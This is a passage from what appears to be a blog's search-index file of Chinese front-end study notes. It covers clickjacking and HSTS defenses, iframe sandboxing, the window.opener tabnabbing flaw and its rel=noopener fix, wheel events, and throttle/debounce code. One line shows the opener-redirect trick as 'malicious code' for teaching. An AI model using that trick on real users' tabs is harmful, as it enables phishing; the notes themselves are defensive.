标准中的一个标签，可以创建包含另外一个页面的内联框架，在点击劫持漏洞利用中主要用来载入目标网页。</p><h4 id="6.3-防御">6.3 防御<a title="#6.3-防御" href="#6.3-防御"></a></h4><h5 id="6.3.1-服务器防御">6.3.1 服务器防御<a title="#6.3.1-服务器防御" href="#6.3.1-服务器防御"></a></h5><ol><li><p><strong>X-FRAME-OPTIONS 机制</strong></p><p>微软提出的一个请求头，专门用来防御 iframe 嵌套的点击劫持攻击，其值有：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">DENY</span> <span class="comment">// 拒绝任何域加载</span></span><br><span class="line"><span class="variable constant_">SAMEORIGIN</span> <span class="comment">// 允许同源域下加载</span></span><br><span class="line"><span class="variable constant_">ALLOW</span>-<span class="variable constant_">FROM</span> <span class="comment">// 可以定义允许frame加载的页面地址</span></span><br></pre></td></tr></table></figure></li><li><p><strong>使用 FrameBusting 代码</strong></p><p>​Web安全研究人员针对 iframe 特性提出 Frame Busting 代码，使用 JavaScript 脚本阻止恶意网站载入网页。如果检测到网页被非法网页载入，就执行自动跳转功能。</p><blockquote><p>Frame Busting代码是一种有效防御网站被攻击者恶意载入的方法，网站开发人员使用Frame Busting代码阻止页面被非法载入。需要指出的情况是，如果用户浏览器禁用JavaScript脚本，那么FrameBusting代码也无法正常运行。所以，该类代码只能提供部分保障功能。</p></blockquote><blockquote><p>具体代码在第八点，iframe</p></blockquote></li><li><p><strong>使用认证码认证用户</strong></p><blockquote><p>点击劫持漏洞通过伪造网站界面进行攻击，网站开发人员可以通过认证码识别用户，确定是用户发出的点击命令才执行相应操作。识别用户的方法中最有效的方法是认证码认证。例如，在网站上广泛存在的发帖认证码，要求用户输入图形中的字符，输入某些图形的特征等。</p></blockquote></li></ol><h5 id="6.3.2-客户端防御">6.3.2 客户端防御<a title="#6.3.2-客户端防御" href="#6.3.2-客户端防御"></a></h5><p>由于点击劫持攻击的代码在客户端执行，因此客户端有很多机制可以防御此漏洞。</p><ol><li><strong>升级浏览器</strong><br>最新版本的浏览器提供很多防御点击劫持漏洞的安全机制，对于普通的互联网用户，经常更新修复浏览器的安全漏洞，能够最有效的防止恶意攻击。</li><li><strong>NoScript 扩展</strong><br>对于Firefox的用户，使用 NoScript 扩展能够在一定程度上检测和阻止点击劫持攻击。利用 NoScript 中 ClearClick 组件能够检测和警告潜在的点击劫持攻击，自动检测页面中可能不安全的页面。</li></ol><h3 id="7.-hsts-—-http严格传输安全">7. HSTS — HTTP严格传输安全<a title="#7.-hsts-—-http严格传输安全" href="#7.-hsts-—-http严格传输安全"></a></h3><h4 id="7.1-场景介绍">7.1 场景介绍<a title="#7.1-场景介绍" href="#7.1-场景介绍"></a></h4><p>有很多网站只通过 HTTPS 对外提供服务，但用户在访问某个网站的时候，只输入 <a href="http://baidu.com">baidu.com</a> 或者 <a href="http://www.baidu.com">www.baidu.com</a> 就会302重定向到 https…。这就存在安全风险，当第一次通过 http 或域名进行访问时，302重定向可能会被劫持，篡改成一个恶意网站。（左边是正常访问流程，右边是被劫持的）</p><p><img src="https://pic1.zhimg.com/v2-d1188ce4a87a3f4f743b6661a4745aa0_r.jpg" alt="preview" style="zoom:70%;float:left" /><img src="https://pic3.zhimg.com/80/v2-73c0c5babeb7991c998ee9c1a9dddcfe_720w.jpg" alt="img" style="zoom:70%;float:left" /></p><blockquote><p>正常流程：浏览器向网站发起一次 HTTP 请求，在得到一个重定向响应后，发起一次 HTTPS 请求并得到最终的响应。在用户眼里：在浏览器直接输入域名可以用 https 协议和网站进行安全通信</p><p>被劫持流程：浏览器发起一次明文 HTTP 请求，但实际上会被攻击者拦截，攻击者作为代理，把当前请求转发给恶意网站，恶意网站返回假的网页内容，攻击者把假的网页内容返回给浏览器。</p></blockquote><h4 id="7.2-解决方式-hsts">7.2 解决方式 HSTS<a title="#7.2-解决方式-hsts" href="#7.2-解决方式-hsts"></a></h4><p>解决思路：避免出现一开始有可能会被劫持的 HTTP 的明文请求和重定向。</p><p>当用户让浏览器发起 HTTP 请求时，浏览器将其转换为 HTTPS 请求，略和过 HTTP 请求和重定向。</p><img src="https://pic2.zhimg.com/80/v2-06b98237cb541f4d60c697bb429dcbd5_720w.jpg" alt="img" style="zoom:70%;float:left" /><p>解决方式：用户在浏览器输入网站域名，<strong>浏览器得知该域名要使用 HTTPS 进行通信</strong>，浏览器直接向网站发起 HTTPS 请求，网站返回相应内容。</p><h4 id="7.3-浏览器怎么知道哪个网站应该发-https-请求？">7.3 浏览器怎么知道哪个网站应该发 HTTPS 请求？<a title="#7.3-浏览器怎么知道哪个网站应该发-https-请求？" href="#7.3-浏览器怎么知道哪个网站应该发-https-请求？"></a></h4><p>HSTS（HTTP Strict Transport Security）HTTP严格传输安全，是一个 Web 安全策略机制。</p><p>其核心是一个 HTTP 响应头，其可以让浏览器知道，在接下来的一段时间内，当前域名只能通过 HTTPS 进行访问，并且在浏览器发现当前连接不安全的情况下，强制拒绝用户的后续访问要求。</p><h5 id="7.3.1-语法">7.3.1 语法<a title="#7.3.1-语法" href="#7.3.1-语法"></a></h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Strict</span>-<span class="title class_">Transport</span>-<span class="title class_">Security</span>: <span class="language-xml">&lt;max-age=&gt;[; includeSubDomains][; preload]</span></span><br></pre></td></tr></table></figure><ul><li>max-age是必选参数，是一个以秒为单位的数值，它代表着HSTS Header的过期时间，通常设置为1年，即31536000秒。</li><li>includeSubDomains是可选参数，如果包含它，则意味着当前域名及其子域名均开启HSTS保护。</li><li>preload是可选参数，只有当你申请将自己的域名加入到浏览器内置列表的时候才需要使用到它。关于浏览器内置列表，下文有详细介绍。</li></ul><blockquote><p>在有效期内，都强制发起 HTTPS 请求</p></blockquote><h3 id="8.-iframe">8. iframe<a title="#8.-iframe" href="#8.-iframe"></a></h3><h5 id="8.1-如何让自己的网站不被其他网站的iframe引用？">8.1 如何让自己的网站不被其他网站的iframe引用？<a title="#8.1-如何让自己的网站不被其他网站的iframe引用？" href="#8.1-如何让自己的网站不被其他网站的iframe引用？"></a></h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 检测当前网站是否被第三方iframe引用</span></span><br><span class="line"><span class="comment">// 若相等证明没有被第三方引用，若不等证明被第三方引用。当发现被引用时强制跳转百度。</span></span><br><span class="line"><span class="keyword">if</span>(top.<span class="property">location</span> != self.<span class="property">location</span>)&#123;</span><br><span class="line">    top.<span class="property">location</span>.<span class="property">href</span> = <span class="string">&#x27;http://www.baidu.com&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="8.2-如何禁用-被使用的-iframe-对当前网站的某些操作？">8.2 如何禁用 被使用的 iframe 对当前网站的某些操作？<a title="#8.2-如何禁用-被使用的-iframe-对当前网站的某些操作？" href="#8.2-如何禁用-被使用的-iframe-对当前网站的某些操作？"></a></h5><p><strong>sandbox</strong> 是html5的新属性，主要是提高iframe安全系数。iframe因安全问题而臭名昭著，这主要是因为iframe常被用于嵌入到第三方中，然后执行某些恶意操作。<br>现在有一场景：我的网站需要 iframe 引用某网站，但是不想被该网站操作DOM、不想加载某些js（广告、弹框等）、当前窗口被强行跳转链接等，我们可以设置 sandbox 属性。如使用多项用空格分隔。</p><ul><li>allow-same-origin：允许被视为同源，即可操作父级DOM或cookie等</li><li>allow-top-navigation：允许当前iframe的引用网页通过url跳转链接或加载</li><li>allow-forms：允许表单提交</li><li>allow-scripts：允许执行脚本文件</li><li>allow-popups：允许浏览器打开新窗口进行跳转</li><li>“”：设置为空时上面所有允许全部禁止</li></ul><h3 id="9.-opener">9. opener<a title="#9.-opener" href="#9.-opener"></a></h3><p>如果在项目中需要 <strong>打开新标签</strong> 进行跳转一般会有两种方式：</p><ol><li>HTML -&gt; <code>&lt;a target='_blank' href='http://www.baidu.com'&gt;</code></li><li>JS  -&gt; <code>window.open('http://www.baidu.com')</code></li></ol><blockquote><p>这两种方式看起来没有问题，但是存在漏洞。<br>通过这两种方式打开的页面可以<strong>使用 window.opener 来访问源页面的 window 对象</strong>。<br>场景：A 页面通过 <a> 或 window.open 方式，打开 B 页面。但是 B 页面存在恶意代码如下：</p><p><code>window.opener.location.replace('https://www.baidu.com') </code>【此代码仅针对打开新标签有效】</p><p>此时，用户正在浏览新标签页，但是原来网站的标签页已经被导航到了百度页面。恶意网站可以伪造一个足以欺骗用户的页面，使得进行恶意破坏。<br>即使在跨域状态下 opener 仍可以调用 location.replace 方法</p></blockquote><h5 id="9.1-&lt;a-traget='_blank'-href=''&gt;">9.1 <code>&lt;a traget='_blank' href=''&gt;</code><a title="#9.1-&lt;a-traget='_blank'-href=''&gt;" href="#9.1-&lt;a-traget='_blank'-href=''&gt;"></a></h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;a target=<span class="string">&quot;_blank&quot;</span> href=<span class="string">&quot;&quot;</span> rel=<span class="string">&quot;noopener noreferrer nofollow&quot;</span>&gt;a标签跳转url&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- </span><br><span class="line">  通过 rel 属性进行控制：</span><br><span class="line">  noopener：会将 <span class="variable language_">window</span>.<span class="property">opener</span> 置空，从而源标签页不会进行跳转（存在浏览器兼容问题）</span><br><span class="line">  noreferrer：兼容老浏览器/火狐。禁用<span class="variable constant_">HTTP</span>头部<span class="title class_">Referer</span>属性（后端方式）。</span><br><span class="line">  nofollow：<span class="variable constant_">SEO</span>权重优化，详情见 <span class="attr">https</span>:<span class="comment">//blog.csdn.net/qq_33981438/article/details/80909881</span></span><br><span class="line"> --&gt;</span><br></pre></td></tr></table></figure><h5 id="9.2-window.open()">9.2 window.open()<a title="#9.2-window.open()" href="#9.2-window.open()"></a></h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;button onclick=<span class="string">&#x27;openurl(&quot;http://www.baidu.com&quot;)&#x27;</span>&gt;click跳转&lt;/button&gt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">openurl</span>(<span class="params">url</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> newTab = <span class="variable language_">window</span>.<span class="title function_">open</span>();</span><br><span class="line">    newTab.<span class="property">opener</span> = <span class="literal">null</span>;</span><br><span class="line">    newTab.<span class="property">location</span> = url;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> furtherNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>滚轮事件</title>
      <link href="/furtherNotes/further/04%20%E6%BB%9A%E8%BD%AE%E4%BA%8B%E4%BB%B6"/>
      <url>/furtherNotes/further/04%20%E6%BB%9A%E8%BD%AE%E4%BA%8B%E4%BB%B6</url>
      
        <content type="html"><![CDATA[<blockquote><p>参考链接：</p><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/WheelEvent">https://developer.mozilla.org/zh-CN/docs/Web/API/WheelEvent</a></p><p><a href="https://juejin.cn/post/6974018969690734628">https://juejin.cn/post/6974018969690734628</a></p><p><a href="https://blog.csdn.net/TXW6666/article/details/106456045">https://blog.csdn.net/TXW6666/article/details/106456045</a></p><p><a href="https://blog.csdn.net/lijingshan34/article/details/88350456">https://blog.csdn.net/lijingshan34/article/details/88350456</a></p></blockquote><h2 id="滚轮事件-wheelevent">滚轮事件 wheelEvent<a title="#滚轮事件-wheelevent" href="#滚轮事件-wheelevent"></a></h2><h3 id="1.-介绍滚轮事件">1. 介绍滚轮事件<a title="#1.-介绍滚轮事件" href="#1.-介绍滚轮事件"></a></h3><p>wheelEvent 接口表示用户滚动鼠标滚轮 或 类似输入设备时触发的事件。</p><ul><li>**该事件为标准规定的滚轮事件接口。**早期的浏览器实现过<a href="https://developer.mozilla.org/zh-CN/docs/conflicting/Web/API/WheelEvent" target="_blank"><code>MouseWheelEvent</code></a>和<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/MouseScrollEvent" target="_blank"><code>MouseScrollEvent</code></a>两种滚轮事件接口，但这两种接口皆非标准，加之各浏览器间对其兼容性极差。</li></ul><blockquote><p>onmousewheel（firefox不支持）  DOMMouseScroll（只有firefox支持）</p><p>因而开发者应使用该标准事件接口取代这两个非标准接口。</p></blockquote><ul><li><p><strong>不要混淆 <code>wheel</code> 事件和 <code>scroll</code> 事件：</strong><code>wheel</code> 事件的默认动作取决于浏览器实现。</p><p>因此 <code>wheel</code> 事件不一定会触发 <code>scroll (en-US)</code> 事件。即便滚轮事件引发了文档内容的滚动行为，也不表示 <code>wheel</code> 事件中的 <code>delta*</code> 值恰好反映文档内容的滚动方向。因此，不要依赖 <code>delta*</code> 属性获知文档内容的滚动方向。可在文档内容滚动事件（<code>scroll</code>）中监视target的<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Element/scrollLeft" target="_blank"><code>scrollLeft</code></a>和<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Element/scrollTop" target="_blank"><code>scrollTop</code></a>的变化以推断滚动方向。</p></li></ul><h3 id="2.-wheel-的事件对象的属性">2. wheel 的事件对象的属性<a title="#2.-wheel-的事件对象的属性" href="#2.-wheel-的事件对象的属性"></a></h3><h4 id="2.1-触发事件">2.1 触发事件<a title="#2.1-触发事件" href="#2.1-触发事件"></a></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;wheel&#x27;</span>,(e)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(e)                          </span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure><h4 id="2.2-&lt;font-color=&quot;red&quot;&gt;事件对象对比&lt;/font&gt;">2.2 <font color="red">事件对象对比</font><a title="#2.2-&lt;font-color=&quot;red&quot;&gt;事件对象对比&lt;/font&gt;" href="#2.2-&lt;font-color=&quot;red&quot;&gt;事件对象对比&lt;/font&gt;"></a></h4><p>在谷歌(左)和火狐打印的结果为：</p><ul><li><p><strong>鼠标滚轮事件对象</strong></p><ol><li><p><strong>页面往下( 滚轮往下滚)</strong></p><img src='./img/wheel down1.png' style="zoom:67%;float:left" ><img src='./img/wheel down2.jpg' style="zoom:70%;float:left" ></li><li><p><strong>页面往上( 滚轮往下滚 )</strong></p><img src='./img/wheel up1.jpg' style="zoom:70%;float:left" ><img src='./img/wheel up2.jpg' style="zoom:70%;float:left" ></li></ol></li><li><p><strong>触摸板滑动事件对象</strong></p><ol><li><p><strong>页面往下( 触摸板向上滑动 )</strong></p><img src="./img/chumoban_down1.jpg" style="zoom:70%; float:left;" ><img src="./img/chumoban_down2.jpg" style="zoom:70%; float:left" ></li><li><p><strong>页面往上( 触摸板往下滑动 )</strong></p><img src="./img/chumoban_up1.jpg" style="zoom:70%; float:left;" ><img src="./img/chumoban_up2.jpg" style="zoom:70%; float:left;" ></li></ol></li></ul><p>总结：<strong>deltalY</strong>：页面向下：&gt; 0 ；页面向上：&lt; 0；</p><p>​           <strong>wheelDelta | wheelDeltaY</strong>：向下 : &lt; 0；向上：&gt;0</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&quot;wheel&quot;</span>, <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> evt = e || <span class="variable language_">window</span>.<span class="property">event</span>;   <span class="comment">//后面为了兼容 ie</span></span><br><span class="line">    evt.<span class="title function_">preventDefault</span>();          <span class="comment">//阻止浏览器默认行为u</span></span><br><span class="line">    <span class="keyword">if</span> (evt.<span class="property">deltaY</span> &gt; <span class="number">0</span> || evt.<span class="property">wheelDelta</span> &lt; <span class="number">0</span>) &#123; ... &#125; </span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (evt.<span class="property">deltaY</span> &lt; <span class="number">0</span> || evt.<span class="property">wheelDelta</span> &gt; <span class="number">0</span>) &#123; ... &#125;</span><br><span class="line">  &#125;,&#123; <span class="attr">passive</span>:<span class="literal">false</span> &#125;);</span><br></pre></td></tr></table></figure><h3 id="3.-passive:-false">3. passive: false<a title="#3.-passive:-false" href="#3.-passive:-false"></a></h3><p><strong>!<code>&#123; passive:false &#125;</code>要加上</strong>，不然滚轮滚动页面的时候会报：<code>Unable to preventDefault inside passive event listener</code></p><p>**原因：**Chorme56+开始为了让页面滚动变得更为流畅，在 window、document 和 body 上注册的 touchstart和 touchmove 事件处理函数，会默认为是 passive: true。</p><blockquote><p>之前：当浏览器首先对默认的事件进行响应的时候，要检查一下是否进行了默认事件的取消。这样就在响应滑动操作之前有那么一丝丝的耽误时间。</p><p>现在：google就决定默认取消了对这个事件的检查，默认时间就取消了。直接执行滑动操作。这样就更加的顺滑了。</p></blockquote><p>浏览器忽略默认事件的preventDefault(), 要是手动阻止会弹出一个警告, 告诉你阻止不了!!!</p><p><strong>解决：</strong></p><ol><li><p><code>window.addEventListener('touchmove', func, &#123; passive: false &#125;)</code></p></li><li><p><code>* &#123; touch-action:none; &#125;</code></p><blockquote><p>touch-action是css中的一个属性，用于设置触摸屏用户如何操纵元素的区域（例如浏览器内置的缩放功能）</p></blockquote></li></ol><h3 id="4.-项目不足">4. 项目不足<a title="#4.-项目不足" href="#4.-项目不足"></a></h3><p>在项目实现的时候，没办法兼容触摸板滑动，因为触摸板每次滑动的时候会触发多次滚轮事件，就会使得页面从第一个板块滑倒页面底部。</p><p>解决方案：节流防抖？</p><p><strong>A：</strong></p><ol><li><p>节流，页面会有一点延迟，不太友好</p></li><li><p>防抖，鼠标滚动事件不会多次触发，还是处理得蛮好的，但是触摸板事件没办法像滚轮事件那样使用，好像并没有阻止到默认事件。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> furtherNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>节流throttle、防抖debounce</title>
      <link href="/furtherNotes/further/05%20%E8%8A%82%E6%B5%81%E9%98%B2%E6%8A%96"/>
      <url>/furtherNotes/further/05%20%E8%8A%82%E6%B5%81%E9%98%B2%E6%8A%96</url>
      
        <content type="html"><![CDATA[<blockquote><p>参考链接：</p><p><a href="https://www.jianshu.com/p/566c66aafa22">https://www.jianshu.com/p/566c66aafa22</a></p><p><a href="https://juejin.cn/post/6959161295358656520">https://juejin.cn/post/6959161295358656520</a></p></blockquote><h3 id="1.-概念">1. 概念<a title="#1.-概念" href="#1.-概念"></a></h3><h4 id="1.1-应用场景">1.1 应用场景<a title="#1.1-应用场景" href="#1.1-应用场景"></a></h4><p>高频触发事件时，可能会频繁执行DOM操作，资源加载等，导致UI停顿甚至浏览器崩溃。</p><ul><li>window对象频繁的 <code>onresize</code>，<code>onscroll</code>等事件</li><li>拖拽的 mousemove 事件</li><li>射击游戏的 mousedown，keydown 事件</li><li>文字输入，自动完成的 keyup 事件</li></ul><h4 id="1.2-解决方案">1.2 解决方案<a title="#1.2-解决方案" href="#1.2-解决方案"></a></h4><p>对于 window 和 resize 事件，实际需求大多为停止改变大于 n 毫秒后执行后续处理；而其他事件大多数的需求是以一定的频率执行后续处理。</p><blockquote><p>针对这两种需求出现了 debounce 和 throttle 两种方式</p></blockquote><h4 id="1.3-节流">1.3 节流<a title="#1.3-节流" href="#1.3-节流"></a></h4><p>高频事件触发，<strong>但在 n 秒<font color='red'>内</font>只会执行一次</strong>，所以节流会稀释函数的执行频率</p><blockquote><p>比如mouseover，resize这种事件，每当有变化的时候，就会触发一次函数，这样很浪费资源。就比如一个持续流水的水龙头，水龙头开到最大的时候很浪费水资源，将水龙头开得小一点，让他每隔200毫秒流出一滴水，这样能源源不断的流出水而又不浪费。</p><p>常见例子：即时查询、不断点击、监听滚动事件触底事件</p></blockquote><h4 id="1.4-防抖">1.4 防抖<a title="#1.4-防抖" href="#1.4-防抖"></a></h4><p><strong>触发高频事件<font color='red'>后 </font>n 秒内函数只会执行一次</strong>，如果n秒内高频事件再次被触发，则重新计算时间</p><blockquote><p>A和B说话，A一直bbbbbb，当A持续说了一段时间的话后停止讲话，过了10秒之后，我们判定A讲完了，B开始回答A的话；如果10秒内A又继续讲话，那么我们判定A没讲完，B不响应，等A再次停止后，我们再次计算停止的时间，如果超过10秒B响应，如果没有则B不响应。</p><p>常见例子：点击按钮、拍照、下拉触底加载下一页等、search 搜索联想、window 触发 resize</p></blockquote><h4 id="1.5-防抖和节流的区别">1.5 防抖和节流的区别<a title="#1.5-防抖和节流的区别" href="#1.5-防抖和节流的区别"></a></h4><ul><li>函数防抖和函数节流都是防止某一时间内频繁触发。</li><li>函数防抖是在指定时间只执行一次，而函数节流是每到指定间隔时间执行一次。</li><li>函数防抖是将几次操作合并为一次操作进行，函数节流使得一定时间内只触发一次函数。</li></ul><h3 id="2.-实现">2. 实现<a title="#2.-实现" href="#2.-实现"></a></h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span> 无处理输入:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">class</span>=<span class="string">&quot;non&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span> 立即防抖处理输入:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">class</span>=<span class="string">&quot;imdebounce&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span> 非立即防抖处理输入:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">class</span>=<span class="string">&quot;unimdebounce&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span> 整合防抖处理输入:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">class</span>=<span class="string">&quot;bothdebounce&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span> 时间戳节流处理输入:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">class</span>=<span class="string">&quot;stampthrottle&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span> 定时器节流处理输入:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">class</span>=<span class="string">&quot;timeoutthrottle&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">function</span> <span class="title function_">pri</span>(<span class="params">obj</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(obj.<span class="property">value</span> + <span class="string">&quot; &quot;</span> + <span class="keyword">new</span> <span class="title class_">Date</span>());</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> non = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.non&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">  non.<span class="title function_">addEventListener</span>(<span class="string">&#x27;keyup&#x27;</span>, <span class="function"><span class="params">e</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">pri</span>(e.<span class="property">target</span>)</span></span><br><span class="line"><span class="language-javascript">  &#125;)</span></span><br><span class="line"><span class="language-javascript">   ...</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="2.1-节流">2.1 节流<a title="#2.1-节流" href="#2.1-节流"></a></h4><blockquote><p>使得一定时间内只触发一次函数。原理是通过判断是否有延迟调用函数未执行。</p></blockquote><ul><li><strong>定时器：</strong> 函数触发是在时间段内结束的时候</li><li><strong>时间戳：</strong> 函数触发是在时间段内开始的时候</li></ul><h5 id="2.1.1-定时器节流">2.1.1 定时器节流<a title="#2.1.1-定时器节流" href="#2.1.1-定时器节流"></a></h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> timenode = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.timeoutthrottle&#x27;</span>);</span><br><span class="line"> <span class="comment">// 定时器</span></span><br><span class="line"> <span class="keyword">function</span> <span class="title function_">timethrottle</span>(<span class="params">func, delay</span>) &#123;</span><br><span class="line">   <span class="keyword">let</span> canrun;</span><br><span class="line">   <span class="keyword">return</span> <span class="keyword">function</span> (<span class="params"><span class="variable language_">arguments</span></span>) &#123;</span><br><span class="line">     <span class="keyword">if</span> (!canrun) &#123;</span><br><span class="line">       canrun = <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">         func.<span class="title function_">call</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>)</span><br><span class="line">         canrun = <span class="literal">null</span>;</span><br><span class="line">       &#125;, delay)</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">const</span> time = <span class="title function_">timethrottle</span>(pri, <span class="number">500</span>);</span><br><span class="line"> timenode.<span class="title function_">addEventListener</span>(<span class="string">&#x27;keyup&#x27;</span>, <span class="function"><span class="params">e</span> =&gt;</span> &#123;</span><br><span class="line">   <span class="title function_">time</span>(e.<span class="property">target</span>)</span><br><span class="line"> &#125;)</span><br></pre></td></tr></table></figure><h5 id="2.1.2-时间戳节流">2.1.2 时间戳节流<a title="#2.1.2-时间戳节流" href="#2.1.2-时间戳节流"></a></h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> stampnode = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.stampthrottle&#x27;</span>);</span><br><span class="line"><span class="comment">// 时间戳</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">stampthrottle</span>(<span class="params">func, delay</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> pre = <span class="number">0</span>;    <span class="comment">//上一次记录时间</span></span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">function</span> (<span class="params"><span class="variable language_">arguments</span></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> now = <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line">    <span class="keyword">if</span> (now - pre &gt;= delay) &#123;</span><br><span class="line">      func.<span class="title function_">call</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>); <span class="comment">//当前时间 - 上次时间 &gt; 延时时间</span></span><br><span class="line">      pre = now;</span><br><span 